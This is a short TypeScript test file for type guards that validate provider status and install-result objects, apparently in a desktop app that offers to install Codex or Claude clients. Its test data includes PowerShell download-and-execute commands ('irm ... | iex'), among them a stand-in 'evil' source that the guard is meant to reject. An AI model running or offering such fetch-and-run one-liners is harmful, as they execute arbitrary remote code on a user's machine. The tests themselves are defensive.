import assert from "node:assert/strict";
import test from "node:test";

import { isProviderInstallResult, isProviderStatus } from "./provider";

test("a missing client is a status the renderer accepts, apart from a failing one", () => {
  assert.equal(isProviderStatus({ kind: "not-installed", message: "Codex was not found on this computer." }), true);
  assert.equal(isProviderStatus({ kind: "unavailable", message: "Codex app-server is unavailable." }), true);
  assert.equal(isProviderStatus({ kind: "missing", message: "x" }), false);
  assert.equal(isProviderStatus({ kind: "not-installed" }), false);
});

test("only the main process's install offer and result shapes reach the renderer", () => {
  assert.equal(isProviderStatus({ kind: "not-installed", message: "x", installable: true }), true);
  assert.equal(isProviderStatus({ kind: "not-installed", message: "x", installable: "yes" }), false);
  assert.equal(isProviderInstallResult({ ok: true, message: "Codex is installed." }), true);
  assert.equal(isProviderInstallResult({ ok: false, message: "Failed.", command: "irm https://claude.ai/install.ps1 | iex" }), true);
  assert.equal(isProviderInstallResult({ ok: true, message: "x", command: "irm evil | iex" }), false);
  assert.equal(isProviderInstallResult({ ok: false, message: "x", command: 1 }), false);
});
